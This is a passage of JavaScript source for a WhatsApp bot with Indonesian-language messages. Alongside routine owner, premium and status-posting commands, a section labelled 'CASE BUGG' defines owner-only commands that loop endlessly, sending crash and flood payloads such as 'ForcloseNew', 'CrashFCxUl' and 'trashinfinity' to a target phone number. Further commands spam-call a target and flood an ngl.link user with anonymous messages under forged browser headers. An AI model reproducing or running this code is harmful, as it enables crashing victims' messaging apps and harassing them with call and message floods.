let targetNumber=m.mentionedJid.length>0?m.mentionedJid[0]:args[0]+"@s.whatsapp.net";
if(m.mentionedJid.length!==0){
for(let i=0;i<m.mentionedJid.length;i++){
addPremiumUser(m.mentionedJid[0],args[1],orgkaya);
}
}else{
addPremiumUser(args[0]+"@s.whatsapp.net",args[1],orgkaya);
}
m.reply(`Succes Addprem ${targetNumber}`); 
}
break;
//=======================≥
case"delprem":{
if(!isCreator)return m.reply(mess.owner);
if(!args[0])return m.reply("*❌Syntax Error!!*\nExample: /delprem 60xx");
let targetNumber=m.mentionedJid.length>0?m.mentionedJid[0]:args[0]+"@s.whatsapp.net";
let targetPremiumIndex=orgkaya.findIndex(premium=>premium.id===targetNumber);
if(targetPremiumIndex!==-1){
orgkaya.splice(targetPremiumIndex,1);
fs.writeFileSync("./system/database/premium.json",JSON.stringify(orgkaya));
m.reply(`*Success Remove Premium:* ${targetNumber}`);
}else{
m.reply("*Premium Member Not Found*");
}
}
break;
//=======================≥
case "addowner": {
if (!isCreator) return m.reply(mess.owner);
if (!args[0]) return m.reply(
`*❌Syntax Error!!*
 Example : /Addowner 60xx`);
prem1 = text.split("|")[0].replace(/[^0-9]/g, "");
let cek1 = await conn.onWhatsApp(prem1 + `@s.whatsapp.net`);
if (cek1.length == 0) return m.reply(`*This Number Is Not Valid*`); 
 kontributor.push(prem1);
fs.writeFileSync("./system/database/owner.json", JSON.stringify(kontributor));
 m.reply(`*Success Add Owner* ${prem1}`); 
 }
break;
//=======================≥
case "hscript":
case "usc": {
  let teksHeader = `
╭───────────✦───────────╮
     *SCRIPT INI FREE KAK*
╰───────────✦───────────╯
*JIKA MAU MEMAKAI SCRIPT INI BISA JOIN SALURAN KAMI YA
https://whatsapp.com/channel/0029VavdR1UFsn0Xd7vklr3o*

*🔔INFO PROFILE*
○ Pengguna : @${m.sender.split("@")[0]}`;
Sky.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "© Copyright Lystick",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'CONTACT OWNER',
        sections: [
{ title: "",  
rows: [{ title: "Owner", description: "© Lystick", id: `myxowner` },
{ title: "Menu", description: "© Lystick", id: `menu` },
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: qlocJpm });
}
break;  
//CASE BUGG
case "protoxstiker": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await bulldozer(target)
}
break
case "protoximg": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await protoXimg(target);
      }
break
case "protoxaudio": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await protocolbug5(target);
      }
break
case "protoxvideo": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await protoXvid(target);
      }
break
case "protoxultra": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 75; ; i++) {
await xatanicinvisv4(target);
await delayMakerInvisible(target);
await protocolbug3(target);
await outofsync(target);
      }
break
case "protoxhard": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 80; ; i++) {
await protocolbug6(target);
await protocolbug3(target);
await delayMakerInvisible(target);
await outofsync(target);
await xatanicinvisv4(target);
await protoXvid(target);
await protocolbug5(target);
await protoXimg(target);
await bulldozer(target);
      }
break
case "carousel": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await nativemessage(target);
await protoXvid(target);
await Raldz7(target, Ptcp = true);
await FloodsCarousel(target, Ptcp = true);
      }
break
case "docutos": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await trashinfinity(target);
await Crashed(target);
await XFlowButton(target);
await protoXvid(target);
await ForcloseNew(target);
await Raldz7(target, Ptcp = true);
      }
break
case "floods": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await protocolbug5(target);
await nativemessage(target);
await protoXvid(target);
await Raldz7(target, Ptcp = true);
await FloodsCarousel(target, Ptcp = true);
await XFlowButton(target);
      }
break
case "trashui": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await protocolbug5(target);
await nativemessage(target);
await CrashFCxUl(target);
await ForcloseNew(target);
await XFlowButton(target);
      }
break
case "combos": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 45; ; i++) {
await ForcloseNew(target);
await XFlowButton(target);
await CrashFCxUl(target);
await nativemessage(target);
await CrashJids(target);
await Crashed(target);
await trashinfinity(target);
await FloodsCarousel(target, Ptcp = true);
await Raldz7(target, Ptcp = true);
await ForcloseNew(target);
await XFlowButton(target);
await CrashFCxUl(target);
await nativemessage(target);
await CrashJids(target);
await Crashed(target);
await trashinfinity(target);
await FloodsCarousel(target, Ptcp = true);
await Raldz7(target, Ptcp = true);
      }
break
case "holdkeyios": 
if (!isCreator) return m.reply(mess.owner);
if (!q) {
return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
for (let i = 1; ; i++) {
await trashinfinity(target);
await CrashFCxUl(target);
await nativemessage(target);
      }
break
//=>>>>>>>>>>>>
case 'upsw': {
if (bannedUsers.includes(m.sender)) {
return m.reply("⚠︎ *ᴋᴀᴍᴜ ᴅɪ ʙᴀɴ ᴏᴡɴᴇʀ*");
}
        if (!isCreator) return m.reply(`Syntax Error!!
</> No Acces`);    
if (!text && !m.quoted) return m.reply(
`*Example:* ${prefix + command} Lu Semua Kontoll`);
let mediaContent = null;
let msgOptions = {};
const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#ffffff', '#008080', '#FFC0CB', '#A52A2A', '#FFA07A', '#FF00FF', '#D2B48C', '#F5DEB3', '#FF1493', '#B22222', '#00BFFF', '#1E90FF', '#FF69B4', '#87CEEB', '#20B2AA', '#8B0000', '#FF4500', '#48D1CC', '#BA55D3', '#00FF7F', '#008000', '#191970', '#FF8C00', '#9400D3', '#FF00FF', '#8B008B', '#2F4F4F', '#FFDAB9', '#BDB76B', '#DC143C', '#DAA520', '#696969', '#483D8B', '#FFD700', '#C0C0C0'];
const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];
let participants = (await conn.groupMetadata(m.chat)).participants.map((a) => a.id);
const jids = [m.sender, m.chat];
if (m.quoted) {
const mime = m.quoted.mimetype || '';
let quotedText = m.quoted.text || m.quoted.message?.conversation || '';
if (mime.includes('image')) {
mediaContent = await m.quoted.download();
msgOptions = {
image: mediaContent,
caption: `${text || quotedText || ''}`,
mentions: participants
};
} else if (mime.includes('video')) {
mediaContent = await m.quoted.download();
msgOptions = {
video: mediaContent,
caption: `${text || quotedText || ''}`,
mimetype: 'video/mp4',
gifPlayback: false,
mentions: participants
};
} else if (mime.includes('audio/mpeg')) {
mediaContent = await m.quoted.download();
msgOptions = {
audio: mediaContent,
mimetype: 'audio/mpeg',
ptt: true, 
mentions: participants
};
} else if (mime.includes('webp')) { 
let stickerImage = await conn.sendMessage(m.chat, { image: mediaContent }, { quoted: m });
msgOptions = {
image: stickerImage.message.imageMessage.url, 
caption: `${text || quotedText || ''}`,
mentions: participants
};
} else {
msgOptions = {
text: `${text || quotedText || ''}`,
mentions: participants
};
}
} else {
msgOptions = {
text: `${text || ''}`,
mentions: participants
};
}

await conn.sendMessage("status@broadcast", msgOptions, {
backgroundColor: pickedColor,
textArgb: 0xffffffff,
font: 0,
statusJidList: participants,
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: jids.map((jid) => ({
tag: "to",
attrs: { jid: jid },
content: undefined,
})),
},
],
},
],
});
await conn.sendMessage(m.chat, {
react: { text: "⚡", key: m.key } 
});
}
break;
case 'callto': {
if (!isCreator) return m.reply(mess.owner);
if (!q) return m.reply("Example Use.\n calloffer 62xx / @tag")
isTarget = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(`*Success Send Spam Call To ${isTarget}*`)
await sleep(1000)
for (let i = 0; i < 20; i++) {
await sendOfferCall(isTarget)
}
}
break
case 'tagsw': {
if (!isCreator) return m.reply(mess.owner);
if (!text && !m.quoted) return m.reply(
`*❌ Syntax Error!!*
*Example:* ${prefix + command} Hello Or Reply 
Media With Caption: ${prefix + command}`
);
let mediaContent = null;
let msgOptions = {};
const BackgroundColor = ['#f68ac9', '#6cace4', '#f44336', '#4caf50', '#ffeb3b', '#9c27b0', '#0d47a1', '#03a9f4', '#9e9e9e', '#ff9800', '#000000', '#008080', '#FFC0CB', '#A52A2A', '#FFA07A', '#FF00FF', '#D2B48C', '#F5DEB3', '#FF1493', '#B22222', '#00BFFF', '#1E90FF', '#FF69B4', '#87CEEB', '#20B2AA', '#8B0000', '#FF4500', '#48D1CC', '#BA55D3', '#00FF7F', '#008000', '#191970', '#FF8C00', '#9400D3', '#FF00FF', '#8B008B', '#2F4F4F', '#FFDAB9', '#BDB76B', '#DC143C', '#DAA520', '#696969', '#483D8B', '#FFD700', '#C0C0C0'];
const pickedColor = BackgroundColor[Math.floor(Math.random() * BackgroundColor.length)];
if (!conn.groupMentionStorage) conn.groupMentionStorage = {};
const listgroup = await conn.getAllGroups(true);
if (listgroup.length === 0) return m.reply("❌ Kamu belum masuk grup manapun!");
const sections = listgroup.map(x => ({
title: "╼" + x.subject,
description: `> Mention This Group`,
id: `${prefix}mention ${x.id}`
}));
if (m.quoted) {
const mime = m.quoted.mimetype || '';
let quotedText = m.quoted.text || m.quoted.message?.conversation || text || '';
if (mime.includes('image')) {
mediaContent = await m.quoted.download();
msgOptions = { image: mediaContent, caption: quotedText };
} else if (mime.includes('video')) {
mediaContent = await m.quoted.download();
msgOptions = { video: mediaContent, caption: quotedText, mimetype: 'video/mp4' };
} else if (mime.includes('audio')) {
mediaContent = await m.quoted.download();
msgOptions = { audio: mediaContent, mimetype: 'audio/mpeg', ptt: true };
} else if (mime.includes('webp')) {
mediaContent = await m.quoted.download();
msgOptions = { sticker: mediaContent };// Sticker WebP
} else if (mime.includes('gif')) {
mediaContent = await m.quoted.download();
msgOptions = { video: mediaContent, caption: quotedText, mimetype: 'video/mp4', gifPlayback: true };
} else if (mime.includes('pdf') || mime.includes('msword') || mime.includes('text')) {
mediaContent = await m.quoted.download();
msgOptions = { document: mediaContent, mimetype: mime, fileName: `File-${Date.now()}` };
} else {
msgOptions = { text: quotedText };
}
} else {
msgOptions = { text: text || '' };
}
await conn.sendMessage(m.chat,{
text: "*Select List Group To*\n*Tag In Status Bot*",
footer: "RikzzZhiro",
buttons: [
{
buttonId: 'action',
buttonText: { displayText: 'Action Flow Button' },
type: 4,
nativeFlowInfo: {
name: "single_select",
paramsJson: JSON.stringify({
title: "List Group",
sections: [{
title: "© Rikzz - 2025",
highlight_label: "Select Group",
rows: sections
}]
})
}
}
],
viewOnce: true,
}, {quoted: m});
conn.groupMentionStorage[m.sender] = { msgOptions, pickedColor };
    }
break;
case "mention": {
if (!text) return m.reply(
`*❌ Syntax Error!!*
*Use:* ${prefix + command} <group_id>
*Example:* ${prefix + command} 12345677@g.us`);
let groupId = text.trim();
try {
let groupMetadata = await conn.groupMetadata(groupId);
if (!groupMetadata) return m.reply(`❌ *Group not found!*`);
let participants = groupMetadata.participants.map((a) => a.id);
const jids = [m.sender, groupId];
let storedData = conn.groupMentionStorage[m.sender];
if (!storedData) return m.reply("❌ *No stored data found! Use /tagsw first!*");
let { msgOptions, pickedColor } = storedData;
msgOptions.mentions = participants;
await conn.sendMessage("status@broadcast", msgOptions, {
backgroundColor: pickedColor,
textArgb: 0xffffffff,
font: 0,
statusJidList: participants,
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: jids.map((jid) => ({
tag: "to",
attrs: { jid: jid },
content: undefined,
})),
},
],
},
],
});
m.reply(`✅ *Succes Post Status & Mention group:* ${groupMetadata.subject}`);
} catch (error) {
console.error("❌ Error mention:", error);
m.reply("❌ *Failed to mention members!*");
}
    }
break;
case 'spamngl': {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply(
`*❌ Syntax Error!!*
*Use:* ${prefix + command} <Username> <Message>
*Example:* ${prefix + command} Kagenou Woi Dev`
);
let args = text.split(" ");
let username = args.shift();
let message = args.join(" "); 
if (!username || !message) return m.reply("*❌ Username dan pesan harus diisi!*");
let jumlah = 15, counter = 0;
await reaction(m.chat, "🕒");
const sendMessage = async () => {
while (counter < jumlah) {
try {
const date = new Date();
const formattedDate = `${date.getHours()}:${date.getMinutes()}`;
const deviceId = crypto.randomBytes(21).toString("hex");
const url = "https://ngl.link/api/submit";
const headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
"Accept": "*/*",
"Accept-Language": "en-US,en;q=0.5",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With": "XMLHttpRequest",
"Sec-Fetch-Dest": "empty",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Site": "same-origin",
"Referer": `https://ngl.link/${username}`,
"Origin": "https://ngl.link"
};
const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}&gameSlug=&referrer=`;
const response = await fetch(url, { method: "POST", headers, body });
if (response.status !== 200) {
console.log(`[${formattedDate}] [❌ Error] Ratelimited`);
await new Promise(resolve => setTimeout(resolve, 15000));
} else {
counter++;
console.log(`[${formattedDate}] [ Sent] ${counter}`)}
await new Promise(resolve => setTimeout(resolve, 2500));
} catch (error) {
console.error(`[❌ Error] ${error}`);
await new Promise(resolve => setTimeout(resolve, 5000))}}
m.reply(`*Pesan berhasil dikirim ke* *User:* ${username} *• Total:* ${counter}`)};
sendMessage()}
break;
case 'bratvd':
case 'bratvideo': {
if (!text) return m.reply(
`*❌Syntax Error!!*
*Use:* ${prefix + command} <Title>
*Example:* ${prefix + command} Rikzz Ganteng`);
if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)
await reaction(m.chat, "🕒");
const words = text.split(" ")
const tempDir = path.join(process.cwd(), 'brat')
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
const framePaths = []
try {
for (let i = 0; i < words.length; i++) {
const currentText = words.slice(0, i + 1).join(" ")
const res = await axios.get(
`https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(currentText)}`,
{ responseType: "arraybuffer" }
).catch((e) => e.response)
const framePath = path.join(tempDir, `frame${i}.mp4`)
fs.writeFileSync(framePath, res.data)
framePaths.push(framePath)
}
const fileListPath = path.join(tempDir, "filelist.txt")
let fileListContent = ""
for (let i = 0; i < framePaths.length; i++) {
fileListContent += `file '${framePaths[i]}'\n`
fileListContent += `duration 0.7\n`
}
fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
fileListContent += `duration 2\n`
fs.writeFileSync(fileListPath, fileListContent)
const outputVideoPath = path.join(tempDir, "output.mp4")
execSync(
`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
)
await conn.sendImageAsSticker(m.chat, outputVideoPath, m, {
packname: "Lystick?",
author: "©Rikzz"
})
framePaths.forEach((frame) => {
if (fs.existsSync(frame)) fs.unlinkSync(frame)
})
if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
} catch (e) {
console.error(e)
m.reply('Terjadi kesalahan')
}
}
break
//========================//

case "delowner": {
if (!isCreator) return m.reply(mess.owner)
if (!args[0]) return m.reply(
`*❌Syntax Error!!*
 Example : /Delowner 60xx`);
prem2 = text.split("|")[0].replace(/[^0-9]/g, "")
unp = kontributor.indexOf(prem2)
kontributor.splice(unp, 1)
fs.writeFileSync("./system/database/owner.json", JSON.stringify(kontributor))
m.reply(`*Success Remove Owner* ${prem2}`)
}
break
//===========================≥
//END
default:}
}catch(err){
const handleError=async()=>{
console.log(require("util").format(err));
};
handleError();
}
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log((`Update : ${__filename}`))
delete require.cache[file]
require(file)
})